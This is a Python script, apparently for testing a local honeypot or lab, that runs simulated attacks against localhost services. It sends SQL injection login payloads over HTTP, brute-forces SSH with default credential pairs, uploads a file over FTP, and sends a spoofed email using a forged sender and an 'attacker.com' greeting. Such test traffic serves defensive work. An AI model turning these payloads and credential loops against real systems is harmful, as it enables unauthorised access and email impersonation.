import requests
import paramiko
import ftplib
import smtplib
import time
from io import BytesIO

print("[*] Starting enhanced simulated attacks...")

# ------------------- HTTP Attacks -------------------
http_url = "http://localhost:8080"
http_payloads = [
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "test", "password": "' OR 1=1--"},
    {"username": "root", "password": "admin' --"}
]

for payload in http_payloads:
    try:
        response = requests.post(http_url, data=payload)
        print(f"[HTTP] Sent payload: {payload} | Response Code: {response.status_code}")
    except Exception as e:
        print(f"[HTTP] Error: {e}")
    time.sleep(1)

# ------------------- SSH Brute Force -------------------
ssh_credentials = [
    ("root", "toor"),
    ("admin", "admin123"),
    ("user", "1234"),
    ("test", "test")
]
ssh_host = "127.0.0.1"
ssh_port = 2222

for username, password in ssh_credentials:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ssh_host, port=ssh_port, username=username, password=password, timeout=5)
        print(f"[SSH] Login successful: {username}/{password}")
        ssh.close()
    except Exception as e:
        print(f"[SSH] Failed login: {username}/{password} | Error: {e}")
    time.sleep(1)

# ------------------- FTP Interaction -------------------
ftp_host = "127.0.0.1"
ftp_port = 2121

try:
    ftp = ftplib.FTP()
    ftp.connect(ftp_host, ftp_port, timeout=5)
    ftp.login("test", "test")
    print("[FTP] Login successful")

    # Send FTP commands
    ftp.retrlines("LIST")
    ftp.storbinary("STOR test.txt", BytesIO(b"Test content"))
    ftp.retrbinary("RETR test.txt", open("/dev/null", "wb").write)
    ftp.quit()
except Exception as e:
    print(f"[FTP] Error: {e}")

# ------------------- SMTP Spoofing -------------------

smtp_host = "127.0.0.1"
smtp_port = 2525

try:
    server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
    server.set_debuglevel(1)
    server.helo("attacker.com")
    server.mail("spoof@victim.com")
    server.rcpt("admin@target.com")
    server.data("Subject: Test Attack\nFrom: spoof@victim.com\nTo: admin@target.com\n\nThis is a spoofed email.\n.")
    server.quit()
    print("[SMTP] Spoofed email sent.")
except Exception as e:
    print(f"[SMTP] Error: {e}")
